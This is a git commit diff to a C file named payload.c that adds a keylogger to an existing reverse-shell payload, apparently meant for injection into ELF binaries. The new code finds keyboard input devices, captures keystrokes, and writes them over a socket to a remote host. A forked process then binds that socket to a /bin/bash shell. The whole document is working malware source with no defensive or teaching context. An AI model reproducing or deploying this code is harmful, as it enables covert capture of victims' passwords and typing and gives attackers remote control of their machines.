11e2491ac1d785fd958c789f28a22d42b755c02f
bogdzn <wontsleep@protonmail.com>
2021-10-26 11:15:26 +0200

    (mod/payload)set up keylogger

--- sources/payload.c
+++ sources/payload.c
@@ -1,7 +1,14 @@
 
 #include "payload.h"
 #include "setup.h"
+#include <bits/types/struct_timeval.h>
+#include <linux/input-event-codes.h>
+#include <linux/input.h>
 #include <netinet/in.h>
+#include <signal.h>
+#include <stdlib.h>
+#include <sys/select.h>
+#include <sys/types.h>
 #include <unistd.h>
 
 int setup_socket(settings_t *g_settings)
@@ -24,8 +31,7 @@ int setup_socket(settings_t *g_settings)
         SO_REUSEADDR | SO_REUSEPORT, &flag, sizeof(int)) < 0) {
         printf("[!] Failure to set socket options: %s\n", strerror(errno));
         return -1;
-    } else if (connect(g_settings->sockfd,
-    (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+    } else if (connect(g_settings->sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
         printf("[!] Failure to connect: %s\n", strerror(errno));
         return -1;
     }
@@ -34,15 +40,142 @@ int setup_socket(settings_t *g_settings)
 }
 
 SECTION(ELF_CODE)
-void setup_payload(settings_t *g_settings)
+int is_keyboard(const struct dirent *file)
+{
+    size_t len = strlen(file->d_name);
+
+    return len > 3
+    && file->d_name[len - 3] == 'k'
+    && file->d_name[len - 2] == 'b'
+    && file->d_name[len - 1] == 'd';
+}
+
+SECTION(ELF_CODE)
+int *get_keyboards_fds(int *nb_fd)
+{
+    struct dirent **devices = NULL;
+    int nb_paths = scandir(DIR_PATH, &devices, &is_keyboard, &alphasort);
+    char *rpath = NULL;
+    int *result = NULL;
+
+    if (nb_paths < 0 ||
+    !(result = malloc(sizeof(int) * (nb_paths + 1))) ||
+    !(rpath = malloc(sizeof(char) * (BUFFER_SIZE+ 1))))
+        return NULL;
+    for (int i = 0; i < nb_paths; i++) {
+        rpath = realpath(devices[i]->d_name, rpath);
+        result[i] = open(rpath, O_RDONLY);
+    }
+    free(rpath);
+    result[nb_paths] = -1;
+    *nb_fd = nb_paths;
+    return result;
+}
+
+SECTION(ELF_CODE)
+bool is_shift(char c)
+{
+    return c == KEY_LEFTSHIFT || c == KEY_RIGHTSHIFT;
+}
+
+char *append(char *buffer, char *to_add)
+{
+    size_t new_len = 0;
+
+    if (!buffer || !(*buffer))
+        return strdup(to_add);
+    new_len = strlen(buffer) + strlen(to_add);
+    buffer = realloc(buffer, sizeof(char) * (new_len + 1));
+    buffer = strcat(buffer, to_add);
+    return buffer;
+}
+
+SECTION(ELF_CODE)
+void log_single_keyboard(int fd, settings_t *s)
+{
+    char *buffer = NULL;
+    static bool is_on_shift = false;
+    int bytes_read = -1;
+    struct input_event evt;
+    struct sigaction reset;
+    struct sigaction ignore = {
+        .sa_handler = SIG_IGN,
+        .sa_flags = 0
+    };
+
+    do {
+        bytes_read = read(fd, &evt, sizeof(struct input_event));
+        if (bytes_read < 0)
+            break;
+        else is_on_shift = is_shift(evt.code);
+
+        if (evt.type == EV_KEY && evt.value == EV_KEY_PRESSED) {
+            if (is_on_shift)
+                buffer = append(buffer, SHIFT_KEYCODES[evt.code]);
+            else buffer = append(buffer, KEYCODES[evt.code]);
+        }
+    } while (bytes_read < 0);
+
+    sigemptyset(&ignore.sa_mask);
+    sigaction(SIGPIPE, &ignore, &reset);
+    dprintf(s->sockfd, "%s", buffer);
+    sigaction(SIGPIPE, &reset, NULL);
+}
+
+SECTION(ELF_CODE)
+void log_keys(settings_t *stg)
+{
+    int nb_fd = 0;
+    int *fds = get_keyboards_fds(&nb_fd);
+
+    struct timeval ts = {
+        .tv_sec = 0,
+        .tv_usec = 50000,
+    };
+    fd_set rs;
+    int s_status = 0;
+
+    if (!fds)
+        return;
+    while (1) {
+        FD_ZERO(&rs);
+        for (int i = 0; i < nb_fd; i++)
+            FD_SET(fds[i], &rs);
+        s_status = select(nb_fd, &rs, NULL, NULL, &ts);
+        if (s_status < 1)
+            continue;
+
+        for (int i = 0; i < nb_fd; i++) {
+            if (FD_ISSET(fds[i], &rs))
+                log_single_keyboard(fds[i], stg);
+        }
+    }
+    for (int i = 0; i < nb_fd; i++)
+        close(fds[i]);
+    free(fds);
+}
+
+SECTION(ELF_CODE)
+void setup_payload(settings_t *stg)
 {
     char * const argv[] = {"/bin/bash", NULL};
+    pid_t pid = 0;
 
-    g_settings->sockfd = setup_socket(g_settings);
+    stg->sockfd = setup_socket(stg);
+    if (stg->sockfd == -1)
+        return;
 
-    printf("[+] Starting revshell.\n");
-    dup2(g_settings->sockfd, 0);
-    dup2(g_settings->sockfd, 1);
-    dup2(g_settings->sockfd, 2);
-    execve("/bin/bash", argv, environ);
+    pid = fork();
+    if (pid == -1) {
+        printf("[!] Failed to create a child\n");
+    } else if (pid == 0) {
+        printf("[+] Starting key logs...\n");
+        log_keys(stg);
+    } else {
+        printf("[+] Starting revshell.\n");
+        dup2(stg->sockfd, 0);
+        dup2(stg->sockfd, 1);
+        dup2(stg->sockfd, 2);
+        execve("/bin/bash", argv, environ);
+    }
 }
